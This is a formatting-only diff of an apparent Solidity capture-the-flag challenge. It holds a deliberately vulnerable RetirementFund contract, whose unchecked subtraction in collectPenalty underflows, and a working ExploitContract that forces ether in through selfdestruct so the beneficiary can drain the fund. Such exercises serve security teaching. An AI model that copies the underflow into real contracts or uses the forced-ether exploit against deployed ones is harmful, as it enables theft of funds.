@@ -1,70 +1,70 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import { console } from 'forge-std/console.sol';
+import {console} from "forge-std/console.sol";
 
 contract RetirementFund {
-  uint256 startBalance;
-  address owner = msg.sender;
-  address beneficiary;
-  uint256 expiration = block.timestamp + 520 weeks;
+    uint256 startBalance;
+    address owner = msg.sender;
+    address beneficiary;
+    uint256 expiration = block.timestamp + 520 weeks;
 
-  constructor(address player) payable {
-    require(msg.value == 1 ether);
+    constructor(address player) payable {
+        require(msg.value == 1 ether);
 
-    beneficiary = player;
-    startBalance = msg.value;
-  }
-
-  function isComplete() public view returns (bool) {
-    return address(this).balance == 0;
-  }
-
-  function withdraw() public {
-    require(msg.sender == owner);
-
-    if (block.timestamp < expiration) {
-      // early withdrawal incurs a 10% penalty
-      (bool ok, ) = msg.sender.call{ value: (address(this).balance * 9) / 10 }('');
-      require(ok, 'Transfer to msg.sender failed');
-    } else {
-      (bool ok, ) = msg.sender.call{ value: address(this).balance }('');
-      require(ok, 'Transfer to msg.sender failed');
-    }
-  }
-
-  function collectPenalty() public {
-    require(msg.sender == beneficiary);
-    uint256 withdrawn = 0;
-
-    unchecked {
-      withdrawn += startBalance - address(this).balance;
-
-      // an early withdrawal occurred
-      require(withdrawn > 0);
+        beneficiary = player;
+        startBalance = msg.value;
     }
 
-    // penalty is what's left
-    (bool ok, ) = msg.sender.call{ value: address(this).balance }('');
-    require(ok, 'Transfer to msg.sender failed');
-  }
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function withdraw() public {
+        require(msg.sender == owner);
+
+        if (block.timestamp < expiration) {
+            // early withdrawal incurs a 10% penalty
+            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
+            require(ok, "Transfer to msg.sender failed");
+        } else {
+            (bool ok,) = msg.sender.call{value: address(this).balance}("");
+            require(ok, "Transfer to msg.sender failed");
+        }
+    }
+
+    function collectPenalty() public {
+        require(msg.sender == beneficiary);
+        uint256 withdrawn = 0;
+
+        unchecked {
+            withdrawn += startBalance - address(this).balance;
+
+            // an early withdrawal occurred
+            require(withdrawn > 0);
+        }
+
+        // penalty is what's left
+        (bool ok,) = msg.sender.call{value: address(this).balance}("");
+        require(ok, "Transfer to msg.sender failed");
+    }
 }
 
 // Write your exploit contract below
 contract ExploitContract {
-  RetirementFund public retirementFund;
-  address public beneficiary;
+    RetirementFund public retirementFund;
+    address public beneficiary;
 
-  constructor(RetirementFund _retirementFund, address _beneficiary) payable {
-    require(msg.value == 1 ether);
-    retirementFund = _retirementFund;
-    beneficiary = _beneficiary;
-  }
+    constructor(RetirementFund _retirementFund, address _beneficiary) payable {
+        require(msg.value == 1 ether);
+        retirementFund = _retirementFund;
+        beneficiary = _beneficiary;
+    }
 
-  function destruct() public {
-    require(msg.sender == beneficiary);
-    selfdestruct(payable(address(retirementFund)));
-  }
+    function destruct() public {
+        require(msg.sender == beneficiary);
+        selfdestruct(payable(address(retirementFund)));
+    }
 
-  receive() external payable {}
+    receive() external payable {}
 }
